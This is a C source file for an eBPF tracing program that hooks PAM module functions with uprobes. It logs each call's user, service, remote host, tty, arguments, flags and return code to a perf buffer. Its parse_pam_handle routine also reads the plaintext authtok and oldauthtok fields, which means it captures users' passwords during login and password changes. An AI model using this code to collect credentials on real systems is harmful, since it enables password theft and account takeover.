#include "vmlinux.h"
#include <string.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

#include <pam-def.bpf.h>

struct {
  __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
  __uint(max_entries, 128);
  __type(key, u32);
  __type(value, u32);
} OUTPUT SEC(".maps");


struct {
  __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
  __uint(max_entries, 1);
  __type(key, u32);
  __type(value, output_info_t);
} OUTPUT_INFO SEC(".maps");


#define TRACE_INIT(NAME) \
    output_info_t *info = create_output_info(STR(NAME)); \
    if (!info) { DEBUG_TRACE("create_output_info failed"); return 0; }

#define TRACE_INIT_RET() \
    output_info_t *info = create_output_info(NULL); \
    if (!info) { DEBUG_TRACE("create_output_info failed"); return 0; }

#define TRACE_END() \
    int __err = 0; \
    if (__err = bpf_perf_event_output(ctx, &OUTPUT, BPF_F_CURRENT_CPU, info, sizeof(output_info_t))) {\
        DEBUG_TRACE("bpf_perf_event_output failed with %i", __err); \
    }

#define TRACE(NAME, ...) \
    int BPF_KPROBE(NAME, ## __VA_ARGS__)

#define TRACE_RET(NAME, ...) \
    int BPF_KRETPROBE(NAME, ## __VA_ARGS__)


static size_t write_small_str_to_heap(heap_t *heap, small_str str) {
    if (heap->taken > HEAP_SIZE - SMALL_STR_SIZE){
        DEBUG_TRACE("free heap space is less than SMALL_STR_SIZE");
        return 0;
    }
    strncpy(FREE_HEAP_PTR(heap), str, SMALL_STR_SIZE);

    size_t written_bytes = min(SMALL_BUF_SIZE, strlen(str) + 1);
    heap->taken += written_bytes;
    return written_bytes;
}

static size_t read_user_str_to_heap(heap_t *heap, const char *str) {
    const unsigned int space_per_record = 64;
    if (heap->taken > HEAP_SIZE - space_per_record){
        DEBUG_TRACE("free heap space is less than space_per_record");
        return 0;
    }

    int ret = bpf_probe_read_user_str(
        FREE_HEAP_PTR(heap),
        space_per_record,
        str
    );
    if (ret < 0){
        write_small_str_to_heap(heap, "%READ_ERROR%");
        return sizeof("%READ_ERROR%");
    }
    heap->taken += ret;
    return (size_t)ret;
}

static size_t read_kernel_str_to_heap(heap_t *heap, const char *str) {
    const unsigned int space_per_record = 64;
    if (heap->taken > HEAP_SIZE - space_per_record){
        DEBUG_TRACE("free heap space is less than space_per_record");
        return 0;
    }

    int ret = bpf_probe_read_kernel_str(
        FREE_HEAP_PTR(heap),
        space_per_record,
        str
    );
    if (ret < 0){
        write_small_str_to_heap(heap, "%READ_ERROR%");
        return sizeof("%READ_ERROR%");
    }
    heap->taken += ret;
    return (size_t)ret;
}

static void convert_heap_delimiters(heap_t *heap){
    const unsigned int border = MAX_BUF_SIZE;
    for (unsigned int i = 0; i < MAX_BUF_SIZE; i++){
        if (heap->buffer[i] == '\0' && i < heap->taken - 1){
            heap->buffer[i] = ' ';
        }
    }
}

static output_info_t* create_output_info(small_str trace_fname){
    int zero = 0;
    output_info_t *output_info = bpf_map_lookup_elem(&OUTPUT_INFO, &zero);
    if (!output_info){
        DEBUG_TRACE("*output_info not found in OUTPUT_INFO array");
        return output_info;
    }

    if (trace_fname){
        strncpy(output_info->gen_info.fname, trace_fname, SMALL_STR_SIZE);
    }
    bpf_get_current_comm(
        output_info->gen_info.procname,
        sizeof(output_info->gen_info.procname)
    );

    output_info->heap.taken = 0;
    output_info->gen_info.pid = bpf_get_current_pid_tgid() >> 32;
    return output_info;
}


static char* pam_ret_to_str(int pam_ret){
#define PAM_RET_TO_STR(VALUE) case VALUE: return #VALUE;
    switch(pam_ret){
        PAM_RET_TO_STR(PAM_SUCCESS);
        PAM_RET_TO_STR(PAM_OPEN_ERR);
        PAM_RET_TO_STR(PAM_SYMBOL_ERR);
        PAM_RET_TO_STR(PAM_SERVICE_ERR);
        PAM_RET_TO_STR(PAM_SYSTEM_ERR);
        PAM_RET_TO_STR(PAM_BUF_ERR);
        PAM_RET_TO_STR(PAM_PERM_DENIED);
        PAM_RET_TO_STR(PAM_AUTH_ERR);
        PAM_RET_TO_STR(PAM_CRED_INSUFFICIENT);
        PAM_RET_TO_STR(PAM_AUTHINFO_UNAVAIL);
        PAM_RET_TO_STR(PAM_USER_UNKNOWN);
        PAM_RET_TO_STR(PAM_MAXTRIES);
        PAM_RET_TO_STR(PAM_NEW_AUTHTOK_REQD);
        PAM_RET_TO_STR(PAM_ACCT_EXPIRED);
        PAM_RET_TO_STR(PAM_SESSION_ERR);
        PAM_RET_TO_STR(PAM_CRED_UNAVAIL);
        PAM_RET_TO_STR(PAM_CRED_EXPIRED);
        PAM_RET_TO_STR(PAM_CRED_ERR);
        PAM_RET_TO_STR(PAM_NO_MODULE_DATA);
        PAM_RET_TO_STR(PAM_CONV_ERR);
        PAM_RET_TO_STR(PAM_AUTHTOK_ERR);
        PAM_RET_TO_STR(PAM_AUTHTOK_RECOVERY_ERR);
        PAM_RET_TO_STR(PAM_AUTHTOK_LOCK_BUSY);
        PAM_RET_TO_STR(PAM_AUTHTOK_DISABLE_AGING);
        PAM_RET_TO_STR(PAM_TRY_AGAIN);
        PAM_RET_TO_STR(PAM_IGNORE);
        PAM_RET_TO_STR(PAM_ABORT);
        PAM_RET_TO_STR(PAM_AUTHTOK_EXPIRED);
        PAM_RET_TO_STR(PAM_MODULE_UNKNOWN);
        PAM_RET_TO_STR(PAM_BAD_ITEM);
        PAM_RET_TO_STR(PAM_CONV_AGAIN);
        PAM_RET_TO_STR(PAM_INCOMPLETE);
    }
#undef PAM_RET_TO_STR

    return "UNKNOWN";
}

static void parse_pam_handle(
        heap_t *heap,
        pam_handle_t *pamh){
    pam_handle_t pam;
    if (bpf_probe_read_user(&pam, sizeof(pam), pamh)){
        write_small_str_to_heap(heap, "PAM HANDLE is NULL");
        return;
    }

    write_small_str_to_heap(heap, "PAM HANDLE: [");
    write_small_str_to_heap(heap, "authtok:");
    read_user_str_to_heap(heap, pam.authtok);

    write_small_str_to_heap(heap, "oldauthtok:");
    read_user_str_to_heap(heap, pam.oldauthtok);

    write_small_str_to_heap(heap, "prompt:");
    read_user_str_to_heap(heap, pam.prompt);

    write_small_str_to_heap(heap, "service_name:");
    read_user_str_to_heap(heap, pam.service_name);

    write_small_str_to_heap(heap, "user:");
    read_user_str_to_heap(heap, pam.user);

    write_small_str_to_heap(heap, "rhost:");
    read_user_str_to_heap(heap, pam.rhost);

    write_small_str_to_heap(heap, "ruser:");
    read_user_str_to_heap(heap, pam.ruser);

    write_small_str_to_heap(heap, "tty:");
    read_user_str_to_heap(heap, pam.tty);

    write_small_str_to_heap(heap, "xdisplay:");
    read_user_str_to_heap(heap, pam.xdisplay);

    write_small_str_to_heap(heap, "authtok_type:");
    read_user_str_to_heap(heap, pam.authtok_type);

    write_small_str_to_heap(heap, "]");
}

static void parse_pam_argv(
        heap_t *heap,
        int argc,
        const char **argv){
    if (argc == 0 || !argv){
        read_kernel_str_to_heap(heap, "#NO ARGS#");
        return;
    }
    argc = argc > 10 ? 10 : argc;

    write_small_str_to_heap(heap, "ARGV: [");
    for (int i = 0; i < argc; i++){
        /* This satisfies verifier */
        char *arg = NULL;
        bpf_probe_read_user(&arg, sizeof(char*), argv+i);
        read_user_str_to_heap(heap, arg);
    }
    write_small_str_to_heap(heap, "]");
}

static void parse_pam_flags(heap_t *heap, int flags){
    write_small_str_to_heap(heap, "PAM FLAGS: [");
    if (flags & PAM_SILENT){
        write_small_str_to_heap(heap, "+PAM_SILENT");
    }
    if (flags & PAM_DISALLOW_NULL_AUTHTOK){
        write_small_str_to_heap(heap, "+PAM_DISALLOW_NULL_AUTHTOK");
    }
    if (flags & PAM_ESTABLISH_CRED){
        write_small_str_to_heap(heap, "+PAM_ESTABLISH_CRED");
    }
    if (flags & PAM_DELETE_CRED){
        write_small_str_to_heap(heap, "+PAM_DELETE_CRED");
    }
    if (flags & PAM_REINITIALIZE_CRED){
        write_small_str_to_heap(heap, "+PAM_REINITIALIZE_CRED");
    }
    if (flags & PAM_REFRESH_CRED){
        write_small_str_to_heap(heap, "+PAM_REFRESH_CRED");
    }
    if (flags & PAM_CHANGE_EXPIRED_AUTHTOK){
        write_small_str_to_heap(heap, "+PAM_CHANGE_EXPIRED_AUTHTOK");
    }

    write_small_str_to_heap(heap, "]");
}

static void pam_sm_call(
      output_info_t *info,
      pam_handle_t *pamh,
      int flags,
      int argc,
      const char **argv){
    parse_pam_handle(&info->heap, pamh);
    parse_pam_argv(&info->heap, argc, argv);
    parse_pam_flags(&info->heap, flags);
    convert_heap_delimiters(&info->heap);
}


SEC("uprobe")
TRACE(pam_sm_authenticate, pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_TRACE("pam_sm_authenticate call");
    TRACE_INIT(pam_sm_authenticate);
    pam_sm_call(info, pamh, flags, argc, argv);
    TRACE_END();
    DEBUG_TRACE("pam_sm_authenticate end");
    return 0;
}

SEC("uprobe")
TRACE(pam_sm_setcred, pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_TRACE("pam_sm_setcred call");
    TRACE_INIT(pam_sm_setcred);
    pam_sm_call(info, pamh, flags, argc, argv);
    TRACE_END();
    DEBUG_TRACE("pam_sm_setcred end");
    return 0;
}


SEC("uprobe")
TRACE(pam_sm_acct_mgmt, pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_TRACE("pam_sm_acct_mgmt call");
    TRACE_INIT(pam_sm_acct_mgmt);
    pam_sm_call(info, pamh, flags, argc, argv);
    TRACE_END();
    DEBUG_TRACE("pam_sm_acct_mgmt end");
    return 0;
}


SEC("uprobe")
TRACE(pam_sm_open_session, pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_TRACE("pam_sm_open_session call");
    TRACE_INIT(pam_sm_open_session);
    pam_sm_call(info, pamh, flags, argc, argv);
    TRACE_END();
    DEBUG_TRACE("pam_sm_open_session end");
    return 0;
}


SEC("uprobe")
TRACE(pam_sm_close_session, pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_TRACE("pam_sm_close_session call");
    TRACE_INIT(pam_sm_close_session);
    pam_sm_call(info, pamh, flags, argc, argv);
    TRACE_END();
    DEBUG_TRACE("pam_sm_close_session end");
    return 0;
}

SEC("uprobe")
TRACE(pam_sm_chauthtok, pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_TRACE("pam_sm_chauthtok call");
    TRACE_INIT(pam_sm_chauthtok);
    pam_sm_call(info, pamh, flags, argc, argv);
    TRACE_END();
    DEBUG_TRACE("pam_sm_chauthtok end");
    return 0;
}


SEC("uretprobe")
TRACE_RET(pam_sm_ret, int pam_ret)
{
    DEBUG_TRACE("pam_sm_ret START");
    TRACE_INIT_RET();

    read_kernel_str_to_heap(&info->heap, pam_ret_to_str(pam_ret));

    TRACE_END();
    DEBUG_TRACE("pam_sm_ret END");
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
